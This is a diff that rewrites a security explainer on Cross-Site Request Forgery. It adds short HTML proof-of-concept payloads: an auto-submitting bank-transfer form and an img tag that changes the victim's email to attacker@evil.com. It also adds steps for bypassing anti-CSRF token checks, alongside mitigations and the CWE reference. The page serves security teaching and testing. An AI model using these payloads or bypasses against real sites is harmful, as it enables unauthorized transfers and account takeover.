@@ -1,31 +1,54 @@
 # What is CSRF?
-CSRF, which stands for Cross-Site Request Forgery, is a type of security vulnerability that exploits the trust a website has in a user's browser. It allows an attacker to perform actions on behalf of a user without their knowledge or consent.
 
-## How Does CSRF Work?
-- Authenticated User: The victim, usually an authenticated user, is tricked into visiting a malicious website or clicking on a specially crafted link.
+Cross-Site Request Forgery (CSRF) tricks a logged-in victim's browser into sending a state-changing request the victim never intended. Because the browser automatically attaches cookies, the target site sees a legitimate, authenticated request. CSRF matters wherever an action relies on cookie-based sessions and has no per-request token.
 
-- Automatic Requests: The malicious website or link contains code that automatically sends forged requests to a different website where the victim is authenticated. These requests can perform actions such as changing account settings, making purchases, or transferring funds.
+## How it works
 
-- Trusted Session: Since the request originates from the victim's browser, the targeted website sees it as a legitimate request coming from the authenticated user.
+- The victim is authenticated to `bank.tld` (session cookie set)
+- The victim visits an attacker page that auto-submits a request to `bank.tld`
+- The browser attaches the cookie, and the action (transfer, email change) executes
 
-## Example Scenario
-Let's say you're logged into your online banking account. While still logged in, you visit a malicious website, perhaps disguised as a harmless link shared on a forum. Unbeknownst to you, this website contains hidden code that automatically submits a request to transfer funds from your bank account to the attacker's account.
+## Proof-of-concept
 
-## Impact of CSRF
-- Unauthorized Transactions: Attackers can perform unauthorized actions on behalf of the victim, such as transferring funds, changing account settings, or deleting data.
+```html
+<!-- Auto-submitting form: fires on page load -->
+<form action="https://bank.tld/transfer" method="POST" id="x">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="5000">
+</form>
+<script>document.getElementById('x').submit()</script>
+```
 
-- Data Theft: CSRF attacks can lead to the theft of sensitive information stored on the targeted website.
+```html
+<!-- GET-based CSRF is even simpler -->
+<img src="https://bank.tld/email/change?new=attacker@evil.com">
+```
 
-- Account Takeover: If the attacker gains control over the victim's account through CSRF, they can effectively take over the account and carry out malicious activities.
+## Tools
 
-## Mitigating CSRF
-- CSRF Tokens: Include unique tokens in each request that are validated by the server to ensure the request originated from a legitimate source.
+- [Burp Suite](https://portswigger.net/burp) - "Generate CSRF PoC" in the context menu
+- [OWASP ZAP](https://www.zaproxy.org/) - CSRF token detection and PoC generation
 
-- Same-Site Cookies: Set cookies to be sent only to the same origin, reducing the risk of CSRF attacks.
+## Manual testing
 
-- Referrer Policy: Configure servers to check the referrer header of incoming requests to ensure they originated from trusted sources.
+1. Capture a state-changing request and check for an anti-CSRF token
+2. Remove the token (or the whole header) and replay - does it still work?
+3. Change the `Content-Type` to bypass token checks tied to JSON
+4. Test whether the token is validated per-user or just for presence
+5. Confirm `SameSite` cookie behavior in the target's real browser flow
 
-- Prompting User Action: Require users to confirm sensitive actions with additional authentication steps, such as entering a password or OTP.
+## Mitigation
 
-## Conclusion
-CSRF attacks exploit the trust between a user's browser and a website they are logged into. By understanding how CSRF works and implementing appropriate security measures, such as CSRF tokens and same-site cookies, web developers can help protect against this type of vulnerability. Regular security audits and updates are essential to maintaining a secure web environment.
+- Use anti-CSRF tokens (synchronizer token pattern), validated server-side
+- Set session cookies to `SameSite=Lax` or `Strict`
+- Require re-authentication or a second factor for sensitive actions
+- Check `Origin`/`Referer` for state-changing requests as defense in depth
+
+## Deep dive
+
+- [CSRF - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [PortSwigger CSRF labs](https://portswigger.net/web-security/csrf)
+
+## CWE
+
+- CWE-352: Cross-Site Request Forgery
